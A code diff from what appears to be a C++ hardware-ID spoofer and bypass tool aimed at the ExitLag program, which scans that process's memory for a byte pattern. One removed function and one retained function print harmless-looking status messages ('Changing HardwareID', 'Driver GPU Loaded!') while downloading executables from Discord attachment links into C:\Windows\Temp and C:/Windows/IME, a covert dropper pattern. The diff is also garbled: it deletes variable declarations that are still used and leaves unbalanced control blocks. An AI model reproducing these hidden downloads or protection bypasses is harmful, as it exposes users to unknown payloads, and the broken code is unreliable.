@@ -71,21 +71,10 @@ void WEB::CheckVersion(string version) {
 }
 
 
-int WEB::Perse() 
-{
-	std::cout << "\x1B[31m[\033[0m\x1B[91m!\033[0m\x1B[31m]\033[0m \Changing HardwareID" << std::endl;
-	string URL = "https://cdn.discordapp.com/attachments/755293152000082005/755460939981258752/ConsoleApp1.exe";
-	string path = "C:\\Windows\\Temp\\ConsoleApp1.exe";
-	URLDownloadToFile(NULL, URL.c_str(), path.c_str(), 0, NULL);
-	return 0;
-} 
-
 void gpusystem()
 	
 {
 	time_t now;
-	struct tm nowLocal;
-	now = time(NULL);
 	nowLocal = *localtime(&now);
 	std::cout << _xor_("\n       [") << nowLocal.tm_mday << "/" << nowLocal.tm_mon + 1 << "/" << nowLocal.tm_year + 1900 << ("|") << nowLocal.tm_hour << ("h") << nowLocal.tm_min << ("] ") << dye::yellow("Driver GPU Loaded!");
 	URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/930892607444381756/935605239250296862/GPU-UUID-Changer.exe"), _T("C:/Windows/IME/GPU-UUID-Changer.exe"), 0, NULL);
@@ -125,11 +114,6 @@ memory::initialize( L"disk.sys" );
 		if ( !raid_extension )
 			continue;
 
-		const auto identity = reinterpret_cast< PSTOR_SCSI_IDENTITY >( std::uintptr_t( raid_extension ) + 0x68 ); // this offset changes per windows build, you figure it out
-		
-		if ( !identity )
-			continue;
-
 		const auto fdo_descriptor = fd_extension->DeviceDescriptor;
 
 		if ( !fdo_descriptor )
@@ -160,10 +144,6 @@ int main()
 	/* Changing the Window size */
 	system("MODE con cols=100 lines=10");
 	/* Allowing utf8 on the console */
-	setlocale(LC_ALL, ""); //utf-8
-	/* Setting console collor */
-	SetConsoleTextAttribute(console, 0x0a);
-
 
 	/* Now we start the bypass */
 
@@ -202,8 +182,9 @@ int main()
 	PatternStringToBytePatternAndMask(pattern_str, &pattern_byte, &mask);
 
 	/* Get the module start address. This is where the function will start to look for the pattern. Then check if it worked*/
-	auto main_module_address = GetModuleAddressByName(Pid, "ExitLag.exe");
-	if (!main_module_address) {
+			HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+				if (processesSnapshot == INVALID_HANDLE_VALUE)
+		return 0;
 		SetConsoleTextAttribute(console, 0x0c);
 		cout << "Error on GetModuleAddress..." << endl;
 		main();
